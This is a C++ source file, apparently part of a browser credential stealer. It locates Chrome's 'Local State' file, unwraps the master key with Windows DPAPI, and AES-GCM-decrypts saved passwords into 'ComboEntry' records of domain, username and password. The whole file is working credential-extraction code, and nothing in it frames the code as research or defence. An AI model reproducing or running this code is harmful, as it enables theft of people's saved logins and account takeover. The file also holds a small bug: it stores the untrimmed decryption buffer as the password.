#include <iostream>
#include <fstream>
#include <string>
#include <sodium.h>
#include <windows.h>
#include <wincrypt.h>
#include <openssl/aes.h>
#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include "DecryptionHandler.h"
#include "json.hpp"

std::string DecryptionHandler::getMasterKey()
{
    std::string localState = std::getenv("LOCALAPPDATA");
    localState += "\\Google\\Chrome\\User Data\\Local State";
    std::ifstream keyFile(localState.data());
    std::string decryptedKey, returnKey;
    nlohmann::json jsonData;
    keyFile >> jsonData;
    decryptedKey = jsonData["os_crypt"]["encrypted_key"];

    unsigned char bin[2048] = {};
    size_t res_len;
    int ret = sodium_base642bin(bin, 2048, decryptedKey.c_str(), decryptedKey.size(), NULL, &res_len, NULL, sodium_base64_VARIANT_ORIGINAL_NO_PADDING);
    
    if (ret == 0)
    {
        std::string dest(bin+5, bin+res_len);
	    DATA_BLOB encryptedKey, plainTextKey;
        encryptedKey.cbData = dest.size();
        encryptedKey.pbData = (BYTE*) (dest.c_str());
        
        if (CryptUnprotectData(&encryptedKey, NULL, NULL, NULL, NULL, 0, &plainTextKey))
        {
            std::string masterKey = std::string(reinterpret_cast<const char*>(plainTextKey.pbData));
            returnKey = masterKey;
        }
        else{
            returnKey = "";
        }
    }

    else{
        returnKey = "";
    }
    
    keyFile.close();
    return returnKey;
}

std::vector<ComboEntry> DecryptionHandler::decryptPasswords(std::string key, std::vector<ComboEntry> entries)
{
    std::vector<ComboEntry> decodedData;
    for (int i=0; i<entries.size(); i++)
    {
        std::string currentPass = entries.at(i).getPassword();
        std::vector<unsigned char> iv(currentPass.begin() + 3, currentPass.begin() + 15);
        std::vector<unsigned char> encryptedPass(currentPass.begin() + 15, currentPass.end() - 16);
        std::vector<unsigned char> decryptPass(currentPass.size());

        EVP_CIPHER_CTX *ctx;
        int len, plaintext;

        ctx = EVP_CIPHER_CTX_new();

        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, iv.size(), NULL);
        EVP_DecryptInit_ex(ctx, NULL, NULL, (unsigned char*) key.c_str(), iv.data());
        EVP_DecryptUpdate(ctx, decryptPass.data(), &len, encryptedPass.data(), encryptedPass.size());

        plaintext = len;
        EVP_DecryptFinal_ex(ctx, decryptPass.data() + len, &len);
        plaintext += len;

        EVP_CIPHER_CTX_free(ctx);

        std::vector<unsigned char> clean(decryptPass.begin(), decryptPass.begin() + plaintext);

        ComboEntry newEntry;
        newEntry.setDomain(entries.at(i).getDomain());
        newEntry.setUsername(entries.at(i).getUsername());
        std::string s(decryptPass.begin(), decryptPass.end());
        newEntry.setPassword(s);
        decodedData.push_back(newEntry);
    }
    return decodedData;
}
